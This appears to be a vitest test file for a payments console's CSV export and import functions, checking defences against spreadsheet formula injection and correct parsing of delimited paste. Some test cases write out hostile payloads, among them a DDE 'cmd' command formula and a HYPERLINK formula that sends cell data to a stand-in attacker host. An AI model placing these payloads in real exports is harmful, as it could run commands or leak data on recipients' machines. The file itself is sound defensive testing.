// The export is the product: step 4 hands a CSV to a finance team who open it in
// Excel. Every value in it originated in a spreadsheet someone pasted in, which
// they did not necessarily author — so it is untrusted text on its way into a
// formula evaluator.
//
// The original single-file console (src/console.html, `downloadCsv`) already
// defended against this. The rewrite dropped it; these tests exist so that cannot
// happen a third time.

import { describe, expect, it } from "vitest";
import { parseDelimited, toCsv } from "../csv";

const cells = (csv: string) => csv.split("\r\n").map((l) => l.split(","));

describe("toCsv — formula injection", () => {
  it.each(["=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"])(
    "neutralises a cell starting %j",
    (payload) => {
      const out = toCsv([[payload]]);
      expect(
        out.includes(`"'${payload.replace(/"/g, '""')}"`) || out.startsWith(`'${payload}`),
      ).toBe(true);
      // The point: the emitted cell must not begin with a bare formula lead.
      const first = out.replace(/^"/, "");
      expect(/^[=+\-@\t\r]/.test(first)).toBe(false);
    },
  );

  it("neutralises the classic command payload", () => {
    const out = toCsv([[`=cmd|'/c calc'!A0`]]);
    expect(out).not.toMatch(/^"?=/);
    expect(out).toContain("'=cmd");
  });

  it("neutralises a HYPERLINK exfiltration attempt in a recipient name", () => {
    const out = toCsv([[`=HYPERLINK("http://evil.example/"&A1,"Payroll")`]]);
    expect(out).not.toMatch(/^"?=/);
  });

  it("leaves ordinary values alone", () => {
    expect(toCsv([["Adaeze Okonkwo", "121.08"]])).toBe("Adaeze Okonkwo,121.08");
  });

  it("still quotes and escapes commas, quotes and newlines", () => {
    expect(toCsv([[`Okonkwo, Adaeze`]])).toBe(`"Okonkwo, Adaeze"`);
    expect(toCsv([[`She said "hi"`]])).toBe(`"She said ""hi"""`);
    expect(toCsv([["a\nb"]])).toBe(`"a\nb"`);
  });

  it("quotes values with edge whitespace, which can otherwise mask a lead", () => {
    expect(toCsv([[" =1+1"]])).toBe(`" =1+1"`);
  });

  it("separates rows with CRLF per RFC 4180", () => {
    expect(toCsv([["a"], ["b"]])).toBe("a\r\nb");
  });

  it("keeps columns aligned for a realistic receipt row", () => {
    const csv = toCsv([
      ["recipient", "amount_usdc", "status"],
      ["=Adaeze", "121.08", "delivered"],
    ]);
    const rows = cells(csv);
    expect(rows[0]).toHaveLength(3);
    expect(rows[1]).toHaveLength(3);
  });
});

// The counterpart: what comes IN. A payee whose name contains a comma shifted every
// field one place left in an early version of the old console, and the surplus field
// was reinterpreted as the amount — the row validated clean and paid a different
// account a different sum.
describe("parseDelimited", () => {
  it("keeps a quoted comma inside one field", () => {
    expect(parseDelimited(`"Okonkwo, Adaeze",0123456789,058,120`)).toEqual([
      ["Okonkwo, Adaeze", "0123456789", "058", "120"],
    ]);
  });

  it("reads tab-separated paste from a spreadsheet", () => {
    expect(parseDelimited("Bob\t123\t058")).toEqual([["Bob", "123", "058"]]);
  });

  it("reads semicolon exports without splitting on the decimal comma", () => {
    expect(parseDelimited("Bob;123;058")).toEqual([["Bob", "123", "058"]]);
  });

  it("survives CRLF and blank input", () => {
    expect(parseDelimited("a,b\r\nc,d")).toEqual([
      ["a", "b"],
      ["c", "d"],
    ]);
    expect(parseDelimited("   ")).toEqual([]);
  });
});
